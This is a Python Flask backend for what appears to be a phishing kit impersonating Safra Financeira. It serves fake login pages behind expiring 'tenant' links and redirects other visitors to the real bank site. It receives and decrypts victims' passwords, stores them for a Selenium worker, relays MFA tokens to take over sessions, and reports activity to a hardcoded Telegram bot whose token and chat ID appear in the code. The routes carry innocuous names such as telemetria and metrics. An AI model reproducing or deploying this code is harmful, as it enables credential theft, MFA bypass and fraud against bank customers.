from flask import render_template, redirect, url_for, request, flash

from safrafinaceira import app, db

from safrafinaceira.models import User, IDs

from datetime import datetime, timedelta

from hashlib import sha256

from cryptography.fernet import Fernet
import random
import string
import base64
from Cryptodome.Cipher import AES

import requests
'''
DICIONARIO - STATUS

NEW_USER -> Usuário novo criado, e será consultado pelo selenium
RUNNING -> Está sendo executado
NEED_USER_CONFIRM_MFA -> Responsável pelo servidor apresentar token de MFA ao usuário e aguardar a confirmação do mesmo
ERR_SELENIUM -> Ocorreu um erro na execução do selenium
SESSION_HARVESTED ->
'''
TOKEN_VALIDATOR = "SA3CGAG14"
key = b'rsxRDRXyHjttjVEj-TgqW7kbctvWaKRE4gahk50DmDs='
cipher = Fernet(key)
TELEGRAM_BOT_TOKEN = "8829371255:AAHIdAy99dT6m01TIooQJGgGE6kvBg4TGUo"
TELEGRAM_CHAT_ID = "-5544200762"
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

def send_telegram_message(TELEGRAM_MESSAGE):
    try:
        telegram_payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": TELEGRAM_MESSAGE,
            "parse_mode": "MarkDown"
        }
        r = requests.post(TELEGRAM_URL, json=telegram_payload, timeout=3)
        return True
    except Exception as e:
        print(f'[-] Ocorreu um erro ao enviar mensagem no telegram: {e}')

def check_tenant(tenant_id):
    msg = f'INFO: Ocorreu uma tentativa de acesso com uso de um Tenant ID inválido/inexistente na base. ID: {tenant_id}'
    tenant_id = IDs.query.filter_by(guid=tenant_id).first()
    if tenant_id:
        if not tenant_id.expired_at:
            tenant_id.expired_at = datetime.now() + timedelta(hours=1)
            db.session.commit()
            msg = f'[INFO] Identificado novo acesso ao Tenant ID: {tenant_id.guid}'
            print(msg)
            send_telegram_message(msg)
            return True

        elif tenant_id.expired_at > datetime.now(): # Tenant ID ainda ativo
            print(f'[+] Acesso a aplicação com tenant ID ativo: {tenant_id.guid}')
            return True

        else:
            msg = f'[-] Ocorreu uma tentativa de acesso com uso de um Tenant ID expirado. ID: {tenant_id.guid}'

    print(msg)
    send_telegram_message(msg)
    return False

def decrypt_pwd(encrypted_data, key, iv):
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    
    # The encrypted data is in two parts: ciphertext and the tag (authentication part)
    ciphertext = encrypted_data[:-16]  # All bytes except the last 16 are the ciphertext
    tag = encrypted_data[-16:]  # The last 16 bytes are the tag

    # Decrypt the message
    decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
    return base64.b64decode(decrypted_data).decode('utf-8')

def encrypt_str(cleartext_str):
    return cipher.encrypt(cleartext_str.encode()).decode()

def decrypt_str(encrypted_str):
    return cipher.decrypt(encrypted_str).decode()

@app.route('/vpo/prospect/trace', methods=['POST'])
def update_mfa():
    data = request.get_json()
    try:
        if data['uuid'] == 'f873ec72-2af5-415b-849c-6710eced1c65':
            user = User.query.filter_by(username=data['u']).first()
            user.token_mfa = data['t']
            user.status = "NEED_USER_CONFIRM_MFA"
            db.session.commit()
            return {"success": True}
        else:
            return {"success": False}
    except Exception as e:
        print(e)
        print('[-] Ocorreu um erro ao atualizar o token MFA')
        return redirect("https://www.safrafinanceira.com.br")


@app.route('/vpo/prospect/telemetria', methods=['GET','POST'])
def get_users():
    data = request.get_json()

    try:
        if data['uuid'] == 'f873ec72-2af5-415b-849c-6710eced1c65':
            if data['status'] == 'NEW_USER':
                users = User.query.filter_by(status='NEW_USER').all()
                #users = User.query.all()
                all_users = {"users": []}
                for user in users:
                    all_users["users"].append(user.to_json())
                    user.status = "RUNNING"
                db.session.commit()
                return all_users
        else:
            pass
    except Exception as e:
        print(e)
        print('[-] Ocorreu um erro ao tratar requisicao ao /vpo/prospect/telemetria')
        return redirect("https://www.safrafinanceira.com.br")

    return '{"data":"error"}'

@app.route('/vpo/prospect/salvarlogs', methods=["POST"])
def savetoken():
    data = request.get_json()

    try:
        if data['uuid'] == 'f873ec72-2af5-415b-849c-6710eced1c65':
            user = User.query.filter_by(username=data['u']).first()
            print('[+] Requisição recebida de %s'%data['u'])
            if not user:

                _pwd = decrypt_pwd(base64.b64decode(data['p']), base64.b64decode(data['k']), base64.b64decode(data['iv']))

                user = User(username=data['u'], password=_pwd, status="NEW_USER", token_mfa="")
                db.session.add(user)
            else:
                user.status = "NEW_USER"
                user.token_mfa = ""
            db.session.commit()
            return {"status": "OK"}
    except Exception as e:
        print(e)
        print('[-] Erro ao acessar a rota /salvarlogs')
        return redirect("https://www.safrafinanceira.com.br/")

@app.route('/vpo/prospect/config', methods=["POST"])
def get_token():
    data = request.get_json()

    try:
        if data['uuid'] == 'f873ec72-2af5-415b-849c-6710eced1c65':
            user = User.query.filter_by(username=data['u']).first()

            return {'user':user.status, 'mfa':user.token_mfa}
    except Exception as e:
        print('[-] Erro ao resgatar token MFA em /salvarlogs')

    return {'user':''}

@app.route("/vpo/prospect/metrics", methods=["POST"])
def get_selenium_error():
    data = request.get_json()

    try:
        if data['uuid'] == 'f873ec72-2af5-415b-849c-6710eced1c65':
            user = User.query.filter_by(username=data['u']).first()
            user.status = data['s']
            db.session.commit()
            return {'user':'OK'}

    except Exception as e:
        print('[-] Erro ao persistir status ede erro em /metrics')

    return {'user':'OK'}

@app.route('/', methods=['GET'])
def principal():
    return redirect("https://www.safrafinanceira.com.br/")

# Front-End page
@app.route("/safra/auth", methods=["GET"])
def auth1():
    if not request.args.get('tenant'):
        print('teste')
        return redirect("https://www.safrafinanceira.com.br")
    print('aa')
    try:
        if check_tenant(request.args.get('tenant')):
            return render_template("auth1.html", tenant=request.args.get('tenant'))
        return redirect("https://www.safrafinanceira.com.br")    
    except Exception as e:
        print(e)
        return redirect("https://www.safrafinanceira.com.br")

@app.route("/safra/auth2", methods=["GET"])
def auth2():
    if not request.args.get('tenant'):
        return redirect("https://www.safrafinanceira.com.br")
    try:
        if check_tenant(request.args.get('tenant')):
            return render_template("auth2.html", tenant=request.args.get('tenant'))
        return redirect("https://www.safrafinanceira.com.br")    
    except Exception as e:
        print(e)
        return redirect("https://www.safrafinanceira.com.br")

@app.route("/safra/report-email", methods=["GET"])
def reportemail():
    try:
        if check_tenant(request.args.get('tenant')):
            return render_template("reportemail.html")
        return redirect("https://www.safrafinanceira.com.br")    
    except Exception as e:
        return redirect("https://www.safrafinanceira.com.br")
    
